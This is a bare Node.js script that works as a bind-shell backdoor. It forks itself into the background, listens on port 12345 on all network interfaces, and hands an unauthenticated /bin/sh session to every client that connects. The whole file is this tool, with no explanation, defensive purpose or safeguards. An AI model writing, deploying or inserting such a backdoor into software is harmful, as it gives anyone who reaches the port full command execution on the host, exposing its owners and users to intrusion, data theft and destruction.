const net = require('net');
const { exec } = require('child_process');

const PORT = 12345;

function daemonize() {
  const fork = require('child_process').fork;
  fork(__filename, ['child']);
  process.exit();
}

function handleConnection(socket) {
  const shell = exec('/bin/sh');

  socket.pipe(shell.stdin);
  shell.stdout.pipe(socket);
  shell.stderr.pipe(socket);

  shell.on('exit', () => {
    socket.end();
  });
}

if (process.argv[2] !== 'child') {
  daemonize();
}

const server = net.createServer(handleConnection);
server.listen(PORT, '0.0.0.0');
